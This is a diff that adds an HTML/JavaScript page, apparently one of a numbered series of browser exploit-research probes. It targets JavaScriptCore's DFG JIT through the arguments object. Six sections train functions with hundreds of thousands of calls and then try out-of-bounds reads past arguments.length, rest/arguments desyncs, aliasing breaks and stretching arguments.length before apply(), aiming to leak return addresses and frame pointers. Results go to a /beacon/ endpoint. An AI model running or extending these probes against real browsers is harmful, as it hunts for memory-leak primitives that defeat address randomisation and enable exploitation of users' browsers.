@@ -1,0 +1,303 @@
+<!--
+  p699: DFG arguments object escape -- frame metadata leak
+
+  In JSC's DFG, the `arguments` object is special-cased. When DFG
+  determines arguments doesn't "escape" the function, it avoids
+  materializing the arguments object and reads directly from the stack
+  frame. If we can trick DFG into thinking arguments stays local while
+  actually leaking it to a scope that observes frame internals, we may
+  read return addresses or saved frame pointers from the stack.
+
+  Additionally, `arguments.callee` in sloppy mode gives access to the
+  function object, and if DFG's elimination of the arguments object
+  is too aggressive, reading past `arguments.length` could access
+  frame metadata (saved registers, return address = code pointer).
+
+  This probe targets:
+  A) arguments[length] and arguments[length+N] after DFG elimination
+  B) arguments.callee property descriptor during DFG (non-standard props)
+  C) Rest parameter vs arguments desync under DFG
+  D) arguments aliasing with named parameters after DFG optimization
+  E) Variadic call with arguments spreading after JIT compilation
+  F) arguments in eval scope (forces materialization, different path)
+
+  CRASH_CLASS: LOW (OOB read attempts on stack frame)
+  prior art: p695 section F (arguments OOB), p630 (text base survey)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p699</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P699-START:DFG-ARGUMENTS-ESCAPE');
+  var results = [];
+
+  // === SECTION A: arguments OOB read after DFG elimination ===
+  b('A:ARGS-OOB-ELIM');
+  try {
+    // DFG sees arguments used only for .length and indexed reads
+    // and eliminates the actual Arguments object creation
+    function argsRead(a, b, c) {
+      var len = arguments.length;
+      var vals = [];
+      // Read past the declared arguments
+      for (var i = 0; i < len + 8; i++) {
+        vals.push(arguments[i]);
+      }
+      return vals;
+    }
+
+    // Train with exactly 3 args
+    for (var i = 0; i < 300000; i++) {
+      argsRead(i, i+1, i+2);
+    }
+    b('A:TRAINED-300K');
+
+    // Now call with 3 args and check indices 3-10
+    var r = argsRead(100, 200, 300);
+    var oob = [];
+    for (var i = 3; i < r.length; i++) {
+      if (r[i] !== undefined) {
+        oob.push(i + ':' + typeof r[i] + '=' + String(r[i]).substring(0, 20));
+      }
+    }
+    if (oob.length > 0) {
+      b('A:OOB-HIT:' + oob.slice(0, 5).join(','));
+      results.push('A:args-oob=' + oob.length);
+    } else {
+      b('A:NO-OOB');
+    }
+
+    // Also try with 0 args but reading index 0-7
+    function zeroArgs() {
+      var vals = [];
+      for (var i = 0; i < 8; i++) vals.push(arguments[i]);
+      return vals;
+    }
+    for (var i = 0; i < 200000; i++) zeroArgs();
+    var z = zeroArgs();
+    var zOob = z.filter(function(v) { return v !== undefined; });
+    if (zOob.length > 0) {
+      b('A:ZERO-OOB:' + zOob.length + ' non-undef');
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: arguments.callee descriptor in DFG ===
+  b('B:CALLEE-DESCRIPTOR');
+  try {
+    function calleeTest() {
+      // In sloppy mode, arguments.callee is the function itself
+      var callee = arguments.callee;
+      // Get all property descriptors of the callee
+      var names = Object.getOwnPropertyNames(callee);
+      var descs = {};
+      for (var i = 0; i < names.length; i++) {
+        try {
+          descs[names[i]] = Object.getOwnPropertyDescriptor(callee, names[i]);
+        } catch(e) {}
+      }
+      return {callee: callee, names: names, funcStr: callee.toString().length};
+    }
+
+    // Train
+    for (var i = 0; i < 200000; i++) calleeTest();
+    b('B:TRAINED-200K');
+
+    var r = calleeTest();
+    b('B:CALLEE-PROPS:' + r.names.join(','));
+    b('B:FUNC-TOSTRING-LEN:' + r.funcStr);
+
+    // Check for non-standard properties that DFG might expose
+    var unexpected = r.names.filter(function(n) {
+      return ['length','name','prototype','arguments','caller'].indexOf(n) < 0;
+    });
+    if (unexpected.length > 0) {
+      b('B:UNEXPECTED:' + unexpected.join(','));
+      results.push('B:callee-props=' + unexpected[0]);
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Rest parameter vs arguments desync ===
+  // DFG handles rest parameters differently from arguments
+  // If both are used, the optimization may produce inconsistent views
+  b('C:REST-VS-ARGS');
+  try {
+    function restArgs(first, ...rest) {
+      // arguments includes first; rest does not
+      // DFG may optimize these two views independently
+      var argsView = [];
+      for (var i = 0; i < arguments.length + 4; i++) {
+        argsView.push(arguments[i]);
+      }
+      return {
+        args: argsView,
+        rest: rest,
+        argsLen: arguments.length,
+        restLen: rest.length
+      };
+    }
+
+    // Train with 5 args
+    for (var i = 0; i < 200000; i++) {
+      restArgs(i, i+1, i+2, i+3, i+4);
+    }
+    b('C:TRAINED-200K');
+
+    // Check for OOB or desync
+    var r = restArgs(10, 20, 30, 40, 50);
+    b('C:ARGSLEN=' + r.argsLen + ',RESTLEN=' + r.restLen);
+
+    var oob = [];
+    for (var i = r.argsLen; i < r.args.length; i++) {
+      if (r.args[i] !== undefined) {
+        oob.push(i + ':' + typeof r.args[i]);
+      }
+    }
+    if (oob.length > 0) {
+      b('C:OOB:' + oob.join(','));
+      results.push('C:rest-desync');
+    }
+
+    // Call with mismatched arg count
+    var r2 = restArgs(10);
+    b('C:SINGLE-ARG:argsLen=' + r2.argsLen + ',restLen=' + r2.restLen);
+    var oob2 = r2.args.filter(function(v, i) { return i >= r2.argsLen && v !== undefined; });
+    if (oob2.length > 0) {
+      b('C:SINGLE-OOB:' + oob2.length);
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Named parameter aliasing in DFG ===
+  // In sloppy mode, arguments[0] aliases the first named parameter
+  // DFG may break this aliasing during optimization
+  b('D:ALIAS-DESYNC');
+  try {
+    function aliasTest(x) {
+      // In sloppy mode: arguments[0] === x (aliased)
+      arguments[0] = 999;
+      // After DFG optimization, x might not reflect the change
+      var xVal = x;
+      // Or: change x and check if arguments[0] changed
+      x = 777;
+      var argVal = arguments[0];
+      return {x: xVal, arg0: argVal, aliased: xVal === 999 && argVal === 777};
+    }
+
+    // Train
+    for (var i = 0; i < 300000; i++) aliasTest(i);
+    b('D:TRAINED-300K');
+
+    var r = aliasTest(42);
+    b('D:x=' + r.x + ',arg0=' + r.arg0 + ',ALIASED=' + r.aliased);
+
+    if (r.x !== 999 || r.arg0 !== 777) {
+      b('D:ALIAS-BROKEN:x=' + r.x + ',arg0=' + r.arg0);
+      results.push('D:alias-broken');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Function.apply with modified arguments ===
+  // If DFG eliminates arguments but we pass it to .apply(),
+  // the reconstruction may include stale frame data
+  b('E:APPLY-STALE');
+  try {
+    function applyTarget() {
+      var vals = [];
+      for (var i = 0; i < arguments.length + 4; i++) {
+        vals.push(arguments[i]);
+      }
+      return vals;
+    }
+
+    function applySource(a, b, c) {
+      // DFG sees arguments only used in .apply
+      // It may avoid materializing and pass frame data directly
+      arguments.length = 10; // extend!
+      return applyTarget.apply(null, arguments);
+    }
+
+    // Train
+    for (var i = 0; i < 200000; i++) applySource(i, i+1, i+2);
+    b('E:TRAINED-200K');
+
+    var r = applySource(100, 200, 300);
+    b('E:RESULT-LEN=' + r.length);
+
+    // Check indices 3-13 for leaked data
+    var leaked = [];
+    for (var i = 3; i < r.length; i++) {
+      if (r[i] !== undefined) {
+        leaked.push(i + ':' + typeof r[i] + '=' + String(r[i]).substring(0, 30));
+      }
+    }
+    if (leaked.length > 0) {
+      b('E:LEAKED:' + leaked.slice(0, 5).join(','));
+      results.push('E:apply-leak=' + leaked.length);
+    } else {
+      b('E:NO-LEAK');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: eval forces arguments materialization ===
+  // When eval() is present, DFG cannot eliminate arguments
+  // This different code path may have different bounds checking
+  b('F:EVAL-ARGS');
+  try {
+    function evalArgs(a, b, c) {
+      // eval presence forces arguments materialization even in DFG
+      var code = 'arguments[' + (arguments.length + 2) + ']';
+      var result = eval(code);
+      return result;
+    }
+
+    // Train (eval prevents full DFG optimization but DFG still runs)
+    for (var i = 0; i < 50000; i++) evalArgs(i, i+1, i+2);
+    b('F:TRAINED-50K');
+
+    var r = evalArgs(100, 200, 300);
+    b('F:EVAL-OOB:' + r + ',TYPE=' + typeof r);
+    if (r !== undefined) {
+      results.push('F:eval-oob=' + r);
+    }
+
+    // Try reading several indices past the end
+    function evalRange(a, b, c) {
+      var leaked = [];
+      for (var off = 0; off < 16; off++) {
+        var v = eval('arguments[' + (arguments.length + off) + ']');
+        if (v !== undefined) leaked.push(off + ':' + typeof v);
+      }
+      return leaked;
+    }
+    for (var i = 0; i < 10000; i++) evalRange(i, i+1, i+2);
+    var range = evalRange(100, 200, 300);
+    if (range.length > 0) {
+      b('F:RANGE-LEAK:' + range.join(','));
+      results.push('F:eval-range=' + range.length);
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P699-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P699-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P699-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p699: DFG arguments escape + frame metadata leak probes</pre></body></html>
